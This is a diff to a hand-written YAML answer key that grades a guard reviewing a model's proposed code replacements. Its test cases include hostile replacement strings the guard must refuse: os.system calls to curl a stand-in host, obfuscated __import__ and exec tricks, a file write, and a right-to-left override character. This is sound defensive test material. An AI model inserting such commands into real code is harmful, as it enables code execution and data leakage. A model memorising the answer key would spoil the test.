@@ -1,7 +1,7 @@
 # The answer key for what a model's proposal must survive, written by hand
 # before `src/obelize/providers/guard.py` existed.
 #
-# One repository, one question, twenty-three answers to it. Every other corpus in
+# One repository, one question, twenty-four answers to it. Every other corpus in
 # this project grades what obelize decided about somebody's code; this one
 # grades what obelize decides about somebody *else's* proposal, which is the
 # only corpus here whose subject is hostile.
@@ -21,8 +21,14 @@
 # range are all graded elsewhere -- `answers.yaml` for the range,
 # `tests/fixtures/scan/` for the finding, `tests/fixtures/commands/` for the
 # rest. What is hand-written here is only what the guard decides: which of the
-# sixteen words each proposal is refused with, in which order the checks are
-# asked, and that exactly one of the twenty-three is accepted.
+# seventeen words each proposal is refused with, in which order the checks are
+# asked, and that exactly one of the twenty-four is accepted.
+#
+# What a proposal quotes. Every case carries `replaces`, the lines it says it is
+# replacing, which the guard compares with what was sent. Most quote lines
+# 31..34 correctly (`quote`, below), so that what a case is about is the only
+# thing in it that differs; `replaces_one_line_more_than_it_quotes` is the one
+# the comparison exists for.
 #
 # Both halves again. A guard graded only by what it refuses would pass while
 # refusing everything, so `accepted` is a case and it is the one that also
@@ -34,7 +40,7 @@
 # well-formed, in range, about the right symbol and imports only the target; it
 # is not a working migration, and nothing here says it is.
 #
-# Fourteen of the sixteen words are reached here. `replacement_not_encodable`
+# Fifteen of the seventeen words are reached here. `replacement_not_encodable`
 # needs a file whose encoding cannot hold what the proposal says, and this
 # repository is UTF-8 throughout; it is graded in
 # `tests/unit/test_providers_guard.py` against the latin-1 shape
@@ -64,6 +70,11 @@ limits:
   replacement_lines: 80
   replacement_bytes: 81920
 
+# What a model that counted right quotes for lines 31..34, as the context shows
+# them: the credential's line is outside them, so nothing is redacted. Every case
+# at that range names this in `replaces`; the others say theirs.
+quote: &quote "        model = genai.GenerativeModel(\n            \"gemini-1.5-flash\",\n            generation_config={\"seed\": 7},\n        )"
+
 cases:
   # -- may we touch this file at all ------------------------------------
   - case: escapes_the_repository
@@ -75,6 +86,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = None"
     refusal: path_outside_root
 
@@ -86,6 +98,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "google-genai>=1"
     refusal: path_not_python
 
@@ -98,6 +111,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = None"
     refusal: path_not_the_consulted_file
 
@@ -109,6 +123,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = None"
     refusal: path_not_the_consulted_file
 
@@ -124,6 +139,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = None"
     refusal: file_changed_since_read
 
@@ -137,6 +153,7 @@ cases:
     start_line: 24
     end_line: 31
     symbol: google.generativeai.GenerativeModel
+    replaces: "def make(kind):\n    \"\"\"Return a summariser bound to one prompt style.\"\"\"\n    prefix = PREFIXES[kind]\n\n    def run(body):\n        # Rotated on 2026-09-01; the key this used to read was\n        # [REDACTED], which the audit log still names.\n        model = genai.GenerativeModel("
     replacement: "def make(kind):\n    model = None"
     refusal: outside_the_context
 
@@ -149,6 +166,7 @@ cases:
     start_line: 32
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: "            \"gemini-1.5-flash\",\n            generation_config={\"seed\": 7},\n        )"
     replacement: '            "gemini-2.0-flash",'
     refusal: site_not_replaced
 
@@ -161,8 +179,25 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel.generate_content
+    replaces: *quote
     replacement: "        model = None"
     refusal: symbol_mismatch
+
+  - case: replaces_one_line_more_than_it_quotes
+    what_it_is: >-
+      The shape the quote exists for. The model means the four lines of the call
+      and writes the range one line long: 31..35 still covers the asked line,
+      is inside the context and names the right symbol, and the result compiles
+      and imports nothing, because what it deletes is the `return` under the
+      call. Every other check passes this proposal; only the quote, four lines
+      against five, says it is not the one that was meant.
+    path: nested.py
+    start_line: 31
+    end_line: 35
+    symbol: google.generativeai.GenerativeModel
+    replaces: *quote
+    replacement: "        from google import genai as new_genai\n\n        model = new_genai.Client().models"
+    refusal: replaced_text_differs
 
   # -- is what it produces Python, and does it bring anything in ---------
   - case: more_lines_than_the_budget
@@ -174,6 +209,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     generated: {kind: lines, count: 81}
     refusal: replacement_too_large
 
@@ -185,6 +221,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     generated: {kind: bytes, count: 81921}
     refusal: replacement_too_large
 
@@ -196,6 +233,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = genai.GenerativeModel("
     refusal: output_does_not_compile
 
@@ -209,6 +247,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = await genai.aio.models.get()"
     refusal: output_does_not_compile
 
@@ -222,6 +261,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     generated: {kind: operands, count: 900}
     refusal: output_does_not_parse
 
@@ -234,6 +274,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        import os\n\n        os.system(\"curl https://evil.example\")\n        model = None"
     refusal: import_outside_the_target
 
@@ -246,6 +287,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        __import__(\"os\").system(\"curl https://evil.example\")\n        model = None"
     refusal: import_outside_the_target
 
@@ -262,6 +304,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        imp = __import__\n        imp(\"os\").system(\"id\")\n        model = None"
     refusal: name_outside_the_question
 
@@ -272,6 +315,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        __builtins__[\"__import__\"](\"os\").system(\"id\")\n        model = None"
     refusal: name_outside_the_question
 
@@ -283,6 +327,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        exec(\"import os; os.system('id')\")\n        model = None"
     refusal: name_outside_the_question
 
@@ -294,6 +339,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        open(\"/tmp/obelize\", \"a\").write(\"x\")\n        model = None"
     refusal: name_outside_the_question
 
@@ -305,6 +351,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        getattr(__builtins__, \"__im\" + \"port__\")(\"os\")\n        model = None"
     refusal: name_outside_the_question
 
@@ -317,6 +364,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = \"[REDACTED]\""
     refusal: replacement_carries_redaction
 
@@ -328,6 +376,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        model = None  # \u202e"
     refusal: replacement_not_displayable
 
@@ -341,6 +390,7 @@ cases:
     start_line: 31
     end_line: 34
     symbol: google.generativeai.GenerativeModel
+    replaces: *quote
     replacement: "        from google import genai as new_genai\n\n        model = new_genai.Client().models"
     refusal: null
     # Thirty-seven lines, four replaced by three.
